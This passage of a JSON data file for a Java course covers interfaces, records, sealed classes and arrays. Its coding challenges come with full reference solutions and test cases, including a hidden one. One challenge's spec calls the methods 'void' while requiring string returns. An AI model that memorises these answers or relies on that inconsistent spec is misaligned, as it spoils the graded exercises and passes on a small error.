              "description": "Create:\n1. Interface Drivable with method: void drive()\n2. Interface Refuelable with method: void refuel()\n3. Class Car implementing BOTH interfaces\n   - drive() should return \"Driving car\"\n   - refuel() should return \"Refueling car\"",
              "instructions": "Create:\n1. Interface Drivable with method: void drive()\n2. Interface Refuelable with method: void refuel()\n3. Class Car implementing BOTH interfaces\n   - drive() should return \"Driving car\"\n   - refuel() should return \"Refueling car\"",
              "starterCode": "interface Drivable {\n    String drive();\n}\n\ninterface Refuelable {\n    String refuel();\n}\n\nclass Car implements Drivable, Refuelable {\n    // Your code here\n}",
              "solution": "// Solution: Multiple Interfaces\n// This demonstrates implementing multiple interfaces\n\ninterface Drivable {\n    String drive();\n}\n\ninterface Refuelable {\n    String refuel();\n}\n\nclass Car implements Drivable, Refuelable {\n    // Implement drive() from Drivable interface\n    @Override\n    public String drive() {\n        return \"Driving car\";\n    }\n    \n    // Implement refuel() from Refuelable interface\n    @Override\n    public String refuel() {\n        return \"Refueling car\";\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-6-multiple-test-1",
                  "description": "Car c = new Car();\nreturn c.drive();",
                  "expectedOutput": "Driving car",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-multiple-test-2",
                  "description": "Car c = new Car();\nreturn c.refuel();",
                  "expectedOutput": "Refueling car",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-multiple-test-3",
                  "description": "Drivable d = new Car();\nreturn d.drive();",
                  "expectedOutput": "Driving car",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-6-multiple-test-4",
                  "description": "Refuelable r = new Car();\nreturn r.refuel();",
                  "expectedOutput": "Refueling car",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-7",
          "title": "Lesson 4.7: Records - Immutable Data Classes",
          "moduleId": "module-04",
          "order": 7,
          "estimatedMinutes": 35,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Too Much Boilerplate",
              "content": "Records are a standard feature since Java 16 and are widely used in modern Java development.\n\nHow much code does it take to create a simple data class in Java?\n\npublic class Person {\n    private final String name;\n    private final int age;\n    \n    public Person(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    \n    public String getName() { return name; }\n    public int getAge() { return age; }\n    \n    @Override\n    public boolean equals(Object o) {\n        if (this == o) return true;\n        if (o == null || getClass() != o.getClass()) return false;\n        Person person = (Person) o;\n        return age == person.age && Objects.equals(name, person.name);\n    }\n    \n    @Override\n    public int hashCode() {\n        return Objects.hash(name, age);\n    }\n    \n    @Override\n    public String toString() {\n        return \"Person[name=\" + name + \", age=\" + age + \"]\";\n    }\n}\n\nThat's over 25 lines for a simple class with just 2 fields!\n\nJava introduced RECORDS to solve this problem."
            },
            {
              "type": "KEY_POINT",
              "title": "Records: One Line = Complete Data Class",
              "content": "A record is a special kind of class designed to hold immutable data.\n\nThe entire Person class above can be written as:\n\npublic record Person(String name, int age) {}\n\nThat's it! ONE LINE!\n\nWhat you get automatically:\n- Private final fields for each component\n- A constructor that takes all components\n- Accessor methods: name() and age() (not getName/getAge)\n- equals() that compares all components\n- hashCode() based on all components\n- toString() that shows all components\n\nUsage:\nPerson alice = new Person(\"Alice\", 30);\nSystem.out.println(alice.name());   // Alice\nSystem.out.println(alice.age());    // 30\nSystem.out.println(alice);          // Person[name=Alice, age=30]"
            },
            {
              "type": "THEORY",
              "title": "Record Syntax and Features",
              "content": "BASIC RECORD:\npublic record Point(int x, int y) {}\n\nRECORD WITH COMPACT CONSTRUCTOR:\nRecords can have a compact constructor for validation:\n\npublic record Person(String name, int age) {\n    public Person {\n        // Compact constructor - no parameters needed\n        if (age < 0) {\n            throw new IllegalArgumentException(\"Age cannot be negative\");\n        }\n        if (name == null || name.isBlank()) {\n            throw new IllegalArgumentException(\"Name is required\");\n        }\n        // Fields are automatically assigned after this block\n    }\n}\n\nRECORD WITH METHODS:\npublic record Rectangle(int width, int height) {\n    // You can add methods to records!\n    public int area() {\n        return width * height;\n    }\n    \n    public int perimeter() {\n        return 2 * (width + height);\n    }\n}\n\nRECORD WITH STATIC MEMBERS:\npublic record Temperature(double celsius) {\n    public static Temperature freezing() {\n        return new Temperature(0);\n    }\n    \n    public static Temperature boiling() {\n        return new Temperature(100);\n    }\n    \n    public double fahrenheit() {\n        return celsius * 9/5 + 32;\n    }\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "Records are Immutable",
              "content": "Records are IMMUTABLE by design:\n\nPerson alice = new Person(\"Alice\", 30);\nalice.age = 31;  // COMPILE ERROR! No setter exists\n\nTo \"change\" a record, create a new one:\n\nPerson olderAlice = new Person(alice.name(), alice.age() + 1);\n\nWHY IMMUTABILITY?\n1. Thread-safe by default (no synchronization needed)\n2. Can be used as map keys safely\n3. Easy to reason about (no unexpected changes)\n4. Functional programming friendly\n\nRECORD RESTRICTIONS:\n- Cannot extend other classes (implicitly extend Record)\n- Cannot be extended (implicitly final)\n- All fields are final (cannot be changed)\n- Cannot declare instance fields (only components)\n\nRECORDS CAN:\n- Implement interfaces\n- Have static fields and methods\n- Have instance methods\n- Override accessor methods (rarely needed)"
            },
            {
              "type": "EXAMPLE",
              "title": "Records in Action",
              "content": "Records provide compact constructors for validation, automatic accessor methods, and built-in toString/equals/hashCode. Use them for immutable data holders like DTOs and value objects.",
              "code": "// Define a simple record\npublic record Student(String name, int grade, double gpa) {\n    // Compact constructor for validation\n    public Student {\n        if (grade < 1 || grade > 12) {\n            throw new IllegalArgumentException(\"Grade must be 1-12\");\n        }\n        if (gpa < 0.0 || gpa > 4.0) {\n            throw new IllegalArgumentException(\"GPA must be 0.0-4.0\");\n        }\n    }\n    \n    // Custom method\n    public boolean isHonorRoll() {\n        return gpa >= 3.5;\n    }\n}\n\n// Using the record\npublic class Main {\n    public static void main(String[] args) {\n        // Create records\n        var alice = new Student(\"Alice\", 10, 3.8);\n        var bob = new Student(\"Bob\", 11, 3.2);\n        \n        // Access components\n        System.out.println(alice.name());  // Alice\n        System.out.println(alice.gpa());   // 3.8\n        \n        // Use custom methods\n        System.out.println(alice.isHonorRoll());  // true\n        System.out.println(bob.isHonorRoll());    // false\n        \n        // Automatic toString\n        System.out.println(alice);  // Student[name=Alice, grade=10, gpa=3.8]\n        \n        // Automatic equals\n        var aliceCopy = new Student(\"Alice\", 10, 3.8);\n        System.out.println(alice.equals(aliceCopy));  // true\n        \n        // Use in collections\n        var students = List.of(alice, bob);\n        for (var student : students) {\n            System.out.println(student.name() + \": \" + student.gpa());\n        }\n    }\n}",
              "language": "java"
            },
            {
              "type": "THEORY",
              "title": "When to Use Records",
              "content": "USE RECORDS FOR:\n- Data Transfer Objects (DTOs)\n- API response/request objects\n- Value objects (Money, Coordinate, Range)\n- Configuration objects\n- Tuple-like groupings of data\n- Immutable data holders\n\nRECORD EXAMPLES:\n\n// API Response\nrecord ApiResponse<T>(T data, String message, int status) {}\n\n// Geographic coordinates\nrecord Coordinate(double latitude, double longitude) {\n    public double distanceTo(Coordinate other) {\n        // Calculate distance...\n    }\n}\n\n// Money with currency\nrecord Money(BigDecimal amount, String currency) {\n    public Money add(Money other) {\n        if (!currency.equals(other.currency)) {\n            throw new IllegalArgumentException(\"Currency mismatch\");\n        }\n        return new Money(amount.add(other.amount), currency);\n    }\n}\n\nDON'T USE RECORDS FOR:\n- Entities that need to change (use regular classes)\n- Classes that need inheritance hierarchies\n- Classes with complex initialization logic\n- JPA/Hibernate entities (they need no-arg constructors)"
            },
            {
              "type": "KEY_POINT",
              "title": "Record Patterns (Java 21+)",
              "content": "Java 21 introduced RECORD PATTERNS - automatically extract record components in pattern matching!\n\nBASIC RECORD PATTERN:\nrecord Point(int x, int y) {}\n\nObject obj = new Point(3, 4);\nif (obj instanceof Point(int x, int y)) {\n    // x and y are extracted automatically!\n    System.out.println(\"x=\" + x + \", y=\" + y);\n}\n\nIN SWITCH EXPRESSIONS:\nrecord Circle(double radius) {}\nrecord Rectangle(double width, double height) {}\n\ndouble getArea(Object shape) {\n    return switch (shape) {\n        case Circle(double r) -> Math.PI * r * r;\n        case Rectangle(double w, double h) -> w * h;\n        default -> 0;\n    };\n}\n\nNESTED RECORD PATTERNS:\nrecord Line(Point start, Point end) {}\n\n// Extract nested components in one pattern!\nif (line instanceof Line(Point(int x1, int y1), Point(int x2, int y2))) {\n    double length = Math.sqrt(Math.pow(x2-x1, 2) + Math.pow(y2-y1, 2));\n}\n\nWHY USE RECORD PATTERNS?\n- Eliminates manual field extraction\n- Type-safe deconstruction\n- Works with sealed classes for exhaustive matching\n- Makes code more declarative and readable"
            },
            {
              "type": "WARNING",
              "title": "Common Records Pitfalls (Java 16+)",
              "content": "1. USING getTitle() INSTEAD OF title():\nRecord accessors do NOT use get prefix!\nbook.getTitle()  // ERROR - method not found\nbook.title()     // CORRECT\n\n2. TRYING TO MODIFY RECORD FIELDS:\nRecords are IMMUTABLE - fields cannot be changed after creation.\nbook.title = \"New Title\";  // ERROR - cannot assign\n// Create new record instead:\nvar updated = new Book(\"New Title\", book.author(), book.pages());\n\n3. RECORDS WITH MUTABLE FIELDS:\nIf a record contains a mutable object (List, array), the record is still logically mutable!\nrecord Team(List<String> members) {}\n// The list can be modified externally!\n// Use defensive copies in compact constructor.\n\n4. FORGETTING COMPACT CONSTRUCTOR SYNTAX:\nrecord Age(int years) {\n    public Age(int years) { ... }  // Verbose\n    public Age { ... }              // Compact - preferred\n}\n\n5. RECORDS CANNOT EXTEND CLASSES:\nrecord Point(int x, int y) extends Shape {}  // ERROR!\n// But records CAN implement interfaces:\nrecord Point(int x, int y) implements Serializable {}"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-7-record-basic",
              "title": "Create a Simple Record",
              "description": "Create a record named 'Book' with:\n- String title\n- String author\n- int pages\n\nIn main, create a Book with title \"1984\", author \"Orwell\", pages 328.\nPrint the book's title using the accessor method.\n\nExpected output: 1984",
              "instructions": "Create a record named 'Book' with:\n- String title\n- String author\n- int pages\n\nIn main, create a Book with title \"1984\", author \"Orwell\", pages 328.\nPrint the book's title using the accessor method.\n\nExpected output: 1984",
              "starterCode": "// Create a Simple Record\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Create a Simple Record\n// Define the Book record\nrecord Book(String title, String author, int pages) {}\n\nvoid main() {\n    // Create a Book record instance\n    var book = new Book(\"1984\", \"Orwell\", 328);\n    \n    // Access and print the title\n    println(book.title());\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-7-record-basic-test-1",
                  "description": "Should print '1984'",
                  "expectedOutput": "1984",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Records are declared with the syntax: record Name(Type field1, Type field2) {}"
                },
                {
                  "level": 2,
                  "text": "Record accessor methods don't use 'get' prefix - just use book.title() not book.getTitle()"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using getTitle() instead of title()",
                  "consequence": "Method not found error",
                  "correction": "Records use component name as accessor: title() not getTitle()"
                },
                {
                  "mistake": "Trying to modify record fields",
                  "consequence": "Compilation error",
                  "correction": "Records are immutable - create a new record instead"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-7-record-method",
              "title": "Record with Custom Method",
              "description": "Create a record 'Rectangle' with:\n- int width\n- int height\n- A method area() that returns width * height\n\nIn main, create a Rectangle(5, 10) and print its area.\n\nExpected output: 50",
              "instructions": "Create a record 'Rectangle' with:\n- int width\n- int height\n- A method area() that returns width * height\n\nIn main, create a Rectangle(5, 10) and print its area.\n\nExpected output: 50",
              "starterCode": "// Record with Custom Method\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Record with Custom Method\n// Define the Rectangle record with custom method\nrecord Rectangle(int width, int height) {\n    int area() {\n        return width * height;\n    }\n}\n\nvoid main() {\n    // Create a Rectangle\n    var rect = new Rectangle(5, 10);\n    \n    // Print the area\n    println(rect.area());\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-7-record-method-test-1",
                  "description": "Should print '50'",
                  "expectedOutput": "50",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "You can add methods inside the record body: record Name(fields) { methods here }"
                },
                {
                  "level": 2,
                  "text": "Inside the method, you can access components directly: width * height"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Declaring width and height as fields inside the record",
                  "consequence": "Duplicate field error",
                  "correction": "Components are already fields - just use them in methods"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-7-record-validation",
              "title": "Record with Validation",
              "description": "Create a record 'Age' with:\n- int years\n- Validation: throw IllegalArgumentException if years < 0\n\nIn main, create Age(25) and print its years.\n\nExpected output: 25",
              "instructions": "Create a record 'Age' with:\n- int years\n- Validation: throw IllegalArgumentException if years < 0\n\nIn main, create Age(25) and print its years.\n\nExpected output: 25",
              "starterCode": "// Record with Validation\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Record with Validation\n// Define the Age record with compact constructor validation\nrecord Age(int years) {\n    Age {\n        if (years < 0) {\n            throw new IllegalArgumentException(\"Age cannot be negative\");\n        }\n    }\n}\n\nvoid main() {\n    // Create a valid Age\n    var age = new Age(25);\n    \n    // Print the years\n    println(age.years());\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-7-record-validation-test-1",
                  "description": "Should print '25'",
                  "expectedOutput": "25",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use a compact constructor: public Age { validation here }"
                },
                {
                  "level": 2,
                  "text": "Compact constructors don't need parameters - they implicitly receive the components"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Writing full constructor with parameters",
                  "consequence": "More verbose than needed",
                  "correction": "Use compact constructor: public Age { } without parameters"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-8",
          "title": "Lesson 4.8: Sealed Classes - Controlled Inheritance",
          "moduleId": "module-04",
          "order": 8,
          "estimatedMinutes": 30,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Uncontrolled Inheritance",
              "content": "Sealed classes are a standard feature since Java 17 and are now widely adopted in modern Java development.\n\nIn traditional Java, any class can be extended unless marked final:\n\npublic class Shape { }\n\n// Anyone can extend Shape!\nclass Circle extends Shape { }  // OK\nclass Triangle extends Shape { }  // OK\nclass WeirdShape extends Shape { }  // Also OK... but should it be?\n\nTHE PROBLEM:\n- You can't control WHO extends your class\n- Pattern matching can't be exhaustive (new subtypes could appear)\n- API design is unclear - which subclasses are \"official\"?\n\nBefore sealed classes, you had only two options:\n1. Leave class open (anyone extends)\n2. Make it final (no one extends)\n\nSealed classes give you a THIRD option: allow SPECIFIC classes to extend."
            },
            {
              "type": "KEY_POINT",
              "title": "Sealed Classes: You Control Who Extends",
              "content": "A SEALED class explicitly lists which classes can extend it:\n\npublic sealed class Shape permits Circle, Rectangle, Triangle {\n    public abstract double area();\n}\n\npublic final class Circle extends Shape {\n    private final double radius;\n    public Circle(double radius) { this.radius = radius; }\n    public double area() { return Math.PI * radius * radius; }\n}\n\npublic final class Rectangle extends Shape {\n    private final double width, height;\n    public Rectangle(double w, double h) { width = w; height = h; }\n    public double area() { return width * height; }\n}\n\npublic final class Triangle extends Shape {\n    private final double base, height;\n    public Triangle(double b, double h) { base = b; height = h; }\n    public double area() { return 0.5 * base * height; }\n}\n\n// This would NOT compile!\nclass Pentagon extends Shape { }  // ERROR: Pentagon is not in permits clause\n\nBENEFITS:\n- Complete control over class hierarchy\n- Compiler knows ALL possible subtypes\n- Enables exhaustive pattern matching"
            },
            {
              "type": "THEORY",
              "title": "Sealed Class Rules",
              "content": "PERMITTED SUBCLASSES MUST:\n1. Be in the same package (or module) as the sealed class\n2. Directly extend the sealed class\n3. Be one of: final, sealed, or non-sealed\n\nTHREE MODIFIERS FOR SUBCLASSES:\n\n// FINAL - Cannot be extended further\npublic final class Circle extends Shape { }\n\n// SEALED - Continues the sealing chain\npublic sealed class Polygon extends Shape permits Triangle, Rectangle { }\n\n// NON-SEALED - Opens hierarchy back up\npublic non-sealed class CustomShape extends Shape { }\n// Now anyone can extend CustomShape\n\nSYNTAX VARIATIONS:\n\n// Implicit permits (when all subclasses in same file)\nsealed class Result {\n    final class Success extends Result { }\n    final class Failure extends Result { }\n}\n// No 'permits' clause needed - compiler infers from same file\n\n// Sealed interfaces work the same way\nsealed interface Expression permits Constant, Add, Multiply { }"
            },
            {
              "type": "KEY_POINT",
              "title": "Sealed Classes + Pattern Matching = Power",
              "content": "The REAL power of sealed classes is EXHAUSTIVE PATTERN MATCHING!\n\nsealed interface Shape permits Circle, Rectangle, Triangle {}\nrecord Circle(double radius) implements Shape {}\nrecord Rectangle(double w, double h) implements Shape {}\nrecord Triangle(double b, double h) implements Shape {}\n\n// Compiler KNOWS all cases - no default needed!\ndouble calculateArea(Shape shape) {\n    return switch (shape) {\n        case Circle(double r) -> Math.PI * r * r;\n        case Rectangle(double w, double h) -> w * h;\n        case Triangle(double b, double h) -> 0.5 * b * h;\n        // No default needed! Compiler knows these are ALL possibilities\n    };\n}\n\nIF YOU FORGET A CASE:\ndouble calculateArea(Shape shape) {\n    return switch (shape) {\n        case Circle(double r) -> Math.PI * r * r;\n        case Rectangle(double w, double h) -> w * h;\n        // COMPILE ERROR: 'switch' expression does not cover all possible input values\n    };\n}\n\nThis makes your code SAFER:\n- Add new shape? Compiler tells you everywhere to update\n- No runtime surprises from unexpected subtypes\n- Self-documenting code structure"
            },
            {
              "type": "EXAMPLE",
              "title": "Sealed Classes in Action: Expression Evaluator",
              "content": "Sealed classes with records create clean, type-safe domain models. The compiler enforces exhaustive handling of all cases.",
              "code": "// Define a sealed expression hierarchy using records\nsealed interface Expr permits Constant, Add, Multiply, Negate {}\n\nrecord Constant(int value) implements Expr {}\nrecord Add(Expr left, Expr right) implements Expr {}\nrecord Multiply(Expr left, Expr right) implements Expr {}\nrecord Negate(Expr expr) implements Expr {}\n\n// Evaluate expressions - compiler ensures all cases handled!\nint evaluate(Expr expr) {\n    return switch (expr) {\n        case Constant(int v) -> v;\n        case Add(Expr l, Expr r) -> evaluate(l) + evaluate(r);\n        case Multiply(Expr l, Expr r) -> evaluate(l) * evaluate(r);\n        case Negate(Expr e) -> -evaluate(e);\n    };\n}\n\n// Pretty print expressions\nString format(Expr expr) {\n    return switch (expr) {\n        case Constant(int v) -> String.valueOf(v);\n        case Add(Expr l, Expr r) -> \"(\" + format(l) + \" + \" + format(r) + \")\";\n        case Multiply(Expr l, Expr r) -> format(l) + \" * \" + format(r);\n        case Negate(Expr e) -> \"-\" + format(e);\n    };\n}\n\nvoid main() {\n    // Build expression: (3 + 4) * 2\n    Expr expr = new Multiply(\n        new Add(new Constant(3), new Constant(4)),\n        new Constant(2)\n    );\n    \n    println(format(expr));    // (3 + 4) * 2\n    println(evaluate(expr));  // 14\n    \n    // Expression: -(5 + 3)\n    Expr neg = new Negate(new Add(new Constant(5), new Constant(3)));\n    println(format(neg));     // -(5 + 3)\n    println(evaluate(neg));   // -8\n}",
              "language": "java"
            },
            {
              "type": "THEORY",
              "title": "When to Use Sealed Classes",
              "content": "USE SEALED CLASSES WHEN:\n- You have a FIXED set of subtypes (known at design time)\n- You want EXHAUSTIVE pattern matching\n- You're modeling domain concepts with clear variants\n- You want to prevent unexpected extensions\n\nGREAT USE CASES:\n- Result types (Success/Failure/Pending)\n- AST nodes (expressions, statements)\n- State machines (states are fixed)\n- Payment methods (Card/Bank/Crypto)\n- HTTP responses (Ok/Error/Redirect)\n\nsealed interface PaymentResult permits Approved, Declined, Pending {}\nrecord Approved(String transactionId) implements PaymentResult {}\nrecord Declined(String reason) implements PaymentResult {}\nrecord Pending(String checkUrl) implements PaymentResult {}\n\nDON'T USE SEALED CLASSES WHEN:\n- Subtypes should be extensible by users\n- The set of subtypes is unknown or growing\n- You're building a library meant for extension\n\nSEALED vs FINAL vs ABSTRACT:\n- abstract: Must be extended, anyone can\n- final: Cannot be extended at all\n- sealed: Can only be extended by specific classes"
            },
            {
              "type": "WARNING",
              "title": "Common Sealed Classes Pitfalls (Java 17+)",
              "content": "1. FORGETTING THE MODIFIER ON SUBCLASSES:\nsealed class Shape permits Circle {}\nclass Circle extends Shape {}  // ERROR!\n// Must be: final class Circle, sealed class Circle, or non-sealed class Circle\n\n2. SUBCLASS NOT IN SAME PACKAGE/MODULE:\nsealed class Shape permits Circle {}  // in package shapes\nfinal class Circle extends Shape {}   // in package other - ERROR!\n\n3. INDIRECT EXTENSION:\nsealed class Shape permits Circle {}\nfinal class Circle extends Shape {}\nclass SmallCircle extends Circle {}  // ERROR! Circle is final\n\n4. FORGETTING permits CLAUSE:\nsealed class Shape {}  // ERROR if subclasses in different files\n// Use permits, or define all subclasses in same file\n\n5. NON-SEALED BREAKS EXHAUSTIVENESS:\nsealed interface Animal permits Dog, Cat, Wild {}\nfinal class Dog implements Animal {}\nfinal class Cat implements Animal {}\nnon-sealed class Wild implements Animal {}  // Opens it up!\n// Now switch needs a default because Wild can have any subclass\n\n6. SEALED CLASSES WORK WITH INTERFACES TOO:\nsealed interface, not just sealed class\nInterfaces are often preferred for sealed hierarchies"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-8-sealed-basic",
              "title": "Create a Sealed Shape Hierarchy",
              "description": "Create a sealed interface Shape with two permitted implementations:\n- record Circle(double radius) with area = PI * r^2\n- record Square(double side) with area = side * side\n\nAdd a method that calculates area using pattern matching.\n\nExpected output: 78.54 (for Circle with radius 5)",
              "instructions": "Create a sealed interface Shape with two permitted implementations:\n- record Circle(double radius) with area = PI * r^2\n- record Square(double side) with area = side * side\n\nAdd a method that calculates area using pattern matching.\n\nExpected output: 78.54 (for Circle with radius 5)",
              "starterCode": "// Create a Sealed Shape Hierarchy\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Create a Sealed Shape Hierarchy\n\nsealed interface Shape permits Circle, Square {}\n\nrecord Circle(double radius) implements Shape {}\nrecord Square(double side) implements Shape {}\n\ndouble calculateArea(Shape shape) {\n    return switch (shape) {\n        case Circle(double r) -> Math.PI * r * r;\n        case Square(double s) -> s * s;\n    };\n}\n\nvoid main() {\n    Shape circle = new Circle(5);\n    // Format to 2 decimal places\n    System.out.printf(\"%.2f%n\", calculateArea(circle));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-8-sealed-basic-test-1",
                  "description": "Should print '78.54' for circle area",
                  "expectedOutput": "78.54",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use 'sealed interface Shape permits Circle, Square {}' to define the sealed interface"
                },
                {
                  "level": 2,
                  "text": "Records automatically implement interfaces: record Circle(double radius) implements Shape {}"
                },
                {
                  "level": 3,
                  "text": "Use switch with record patterns: case Circle(double r) -> Math.PI * r * r;"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting the permits clause",
                  "consequence": "Compiler error or unexpected behavior",
                  "correction": "Use 'sealed interface Shape permits Circle, Square {}'"
                },
                {
                  "mistake": "Using default case when not needed",
                  "consequence": "Loses exhaustiveness checking benefit",
                  "correction": "With sealed types, list all cases explicitly - no default needed"
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-8-sealed-result",
              "title": "Result Type Pattern",
              "description": "Create a sealed Result type for operation outcomes:\n- record Success(String message)\n- record Failure(String error)\n\nWrite a method that returns Success or Failure based on a condition.\nPrint appropriate message using pattern matching.\n\nTest: If input > 0, return Success(\"Positive\"), else Failure(\"Not positive\")\nInput: 5\nExpected output: Success: Positive",
              "instructions": "Create a sealed Result type for operation outcomes:\n- record Success(String message)\n- record Failure(String error)\n\nWrite a method that returns Success or Failure based on a condition.\nPrint appropriate message using pattern matching.",
              "starterCode": "// Result Type Pattern\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Result Type Pattern\n\nsealed interface Result permits Success, Failure {}\n\nrecord Success(String message) implements Result {}\nrecord Failure(String error) implements Result {}\n\nResult checkNumber(int num) {\n    if (num > 0) {\n        return new Success(\"Positive\");\n    } else {\n        return new Failure(\"Not positive\");\n    }\n}\n\nString formatResult(Result result) {\n    return switch (result) {\n        case Success(String msg) -> \"Success: \" + msg;\n        case Failure(String err) -> \"Failure: \" + err;\n    };\n}\n\nvoid main() {\n    Result result = checkNumber(5);\n    println(formatResult(result));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-8-sealed-result-test-1",
                  "description": "Should print 'Success: Positive'",
                  "expectedOutput": "Success: Positive",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Define: sealed interface Result permits Success, Failure {}"
                },
                {
                  "level": 2,
                  "text": "Use records for both variants: record Success(String message) implements Result {}"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Using class instead of record",
                  "consequence": "More boilerplate code",
                  "correction": "Records are perfect for sealed type variants - use them!"
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-8-sealed-expression",
              "title": "Simple Expression Evaluator",
              "description": "Create a sealed expression hierarchy:\n- record Num(int value)\n- record Add(Expr left, Expr right)\n\nWrite an evaluate method using pattern matching.\nTest: evaluate(Add(Num(3), Num(4))) should return 7\n\nExpected output: 7",
              "instructions": "Create a sealed expression hierarchy:\n- record Num(int value)\n- record Add(Expr left, Expr right)\n\nWrite an evaluate method using pattern matching.",
              "starterCode": "// Simple Expression Evaluator\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Simple Expression Evaluator\n\nsealed interface Expr permits Num, Add {}\n\nrecord Num(int value) implements Expr {}\nrecord Add(Expr left, Expr right) implements Expr {}\n\nint evaluate(Expr expr) {\n    return switch (expr) {\n        case Num(int v) -> v;\n        case Add(Expr l, Expr r) -> evaluate(l) + evaluate(r);\n    };\n}\n\nvoid main() {\n    Expr expr = new Add(new Num(3), new Num(4));\n    println(evaluate(expr));\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-8-sealed-expression-test-1",
                  "description": "Should print '7'",
                  "expectedOutput": "7",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "sealed interface Expr permits Num, Add {}"
                },
                {
                  "level": 2,
                  "text": "Add has two Expr children - use recursion to evaluate them"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting to recursively evaluate nested expressions",
                  "consequence": "Cannot handle nested Add expressions",
                  "correction": "Call evaluate recursively: evaluate(l) + evaluate(r)"
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        }
      ],
      "order": 4
    },
    {
      "id": "module-05",
      "title": "Collections and Functional Programming",
      "description": "Work with arrays, lists, maps, and functional programming with lambdas and streams.",
      "difficulty": "beginner",
      "estimatedHours": 3.2,
      "lessons": [
        {
          "id": "epoch-3-lesson-1",
          "title": "Lesson 5.1: Arrays - Storing Multiple Values",
          "moduleId": "module-05",
          "order": 1,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Many Related Values",
              "content": "You want to store the scores of 5 students:\n\nint score1 = 85;\nint score2 = 92;\nint score3 = 78;\nint score4 = 95;\nint score5 = 88;\n\nTo calculate the average:\nint total = score1 + score2 + score3 + score4 + score5;\ndouble avg = total / 5.0;\n\nThis doesn't scale! What if you have 100 students? 1000?\n\nYou need a way to store MANY values of the same type under ONE name.\n\nThis is what ARRAYS do!"
            },
            {
              "type": "KEY_POINT",
              "title": "Arrays are Like a Row of Numbered Boxes",
              "content": "Imagine a row of mail boxes in an apartment building:\n\n[Box 0] [Box 1] [Box 2] [Box 3] [Box 4]\n\nEach box:\n- Holds ONE item\n- Has a NUMBER (index)\n- Contains the SAME TYPE of thing\n\nIn Java:\nint[] scores = new int[5];\nscores[0] = 85;  // Put 85 in box 0\nscores[1] = 92;  // Put 92 in box 1\n\n⚠️ Arrays start at index 0, not 1!"
            },
            {
              "type": "THEORY",
              "title": "Array Syntax",
              "content": "Creating an array:\n\n// Method 1: Declare size, fill later\nint[] numbers = new int[5];\nnumbers[0] = 10;\nnumbers[1] = 20;\n\n// Method 2: Declare with values\nint[] numbers = {10, 20, 30, 40, 50};\n\nAccessing elements:\nSystem.out.println(numbers[0]);  // 10\nSystem.out.println(numbers[4]);  // 50\n\nArray length:\nnumbers.length  // 5\n\nLooping through array:\nfor (int i = 0; i < numbers.length; i++) {\n    System.out.println(numbers[i]);\n}"
            },
            {
              "type": "WARNING",
              "title": "Common Array Pitfalls",
